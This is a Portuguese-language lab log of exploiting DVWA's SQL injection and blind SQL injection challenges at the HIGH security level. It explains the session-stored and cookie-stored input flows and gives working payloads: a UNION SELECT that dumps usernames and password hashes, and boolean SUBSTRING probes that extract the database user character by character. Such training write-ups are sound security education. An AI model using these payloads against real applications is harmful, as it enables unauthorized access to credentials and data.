# DVWA - SQL Injection + Blind SQL Injection (High) — Diário de Execução

## Contexto

O objetivo foi explorar as vulnerabilidades de SQL Injection (normal e blind) no nível HIGH do DVWA, entendendo como o fluxo da aplicação muda e como isso impacta a exploração.

---

## SQL Injection (HIGH)

### Funcionamento

Diferente do nível LOW, o input não é enviado diretamente via GET.

O fluxo é:

1. O valor é enviado via POST para:
   /vulnerabilities/sqli/session-input.php

2. O servidor armazena o valor em:
   $_SESSION['id']

3. Outra página utiliza esse valor em uma query SQL

---

### Vulnerabilidade

O valor armazenado na sessão é utilizado diretamente na query:

SELECT first_name, last_name FROM users WHERE user_id = '$id'

Sem sanitização adequada.

---

### Exploração

#### Passo 1 — Interceptar requisição

Interceptar o POST para:

/vulnerabilities/sqli/session-input.php

---

#### Passo 2 — Injetar payload

Exemplo:

1' UNION SELECT user, password FROM users-- -

---

#### Passo 3 — Enviar

O payload é salvo na sessão.

---

#### Passo 4 — Acessar página principal

/vulnerabilities/sqli/

---

### Resultado

A aplicação retorna dados do banco, como:

- usernames
- hashes de senha

---

### Observação

Trata-se de um caso de second-order SQL Injection, onde o payload é armazenado e executado posteriormente.

---

## SQL Injection Blind (HIGH)

### Funcionamento

O fluxo utiliza cookies:

1. O valor é enviado via formulário
2. O servidor armazena em cookie (id)
3. A query utiliza o valor do cookie

---

### Código relevante

$id = $_COOKIE['id'];

SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;

---

### Comportamento da aplicação

- Se encontrar resultado:
  User ID exists in the database.

- Caso contrário:
  User ID is MISSING from the database.

---

### Exploração

#### Passo 1 — Interceptar requisição

Interceptar request para:

/vulnerabilities/sqli_blind/

---

#### Passo 2 — Modificar cookie

Exemplo:

Cookie: id=1' AND 1=1#

---

#### Passo 3 — Analisar resposta

- TRUE → User ID exists
- FALSE → User ID is MISSING

---

### Extração de dados

#### Exemplo:

1' AND SUBSTRING(user(),1,1)='a'#

Se TRUE, o primeiro caractere é 'a'.

---

### Continuação

Repetir para cada posição:

1' AND SUBSTRING(user(),2,1)='d'#
1' AND SUBSTRING(user(),3,1)='m'#
1' AND SUBSTRING(user(),4,1)='i'#
1' AND SUBSTRING(user(),5,1)='n'#

---

### Resultado

admin

---

### Observação

O uso de time-based SQLi não é confiável devido ao delay aleatório introduzido pela aplicação.

---

## Conclusão

- SQL Injection (HIGH) ainda é explorável via session
- Blind SQL Injection permite extração de dados mesmo sem output direto
- O sistema confia em inputs indiretos (session e cookie)
- Falta de sanitização mantém a vulnerabilidade

---

## Conclusão final

O nível HIGH aumenta a complexidade, mas não elimina a vulnerabilidade.

A exploração depende do entendimento do fluxo da aplicação e da adaptação da técnica utilizada.
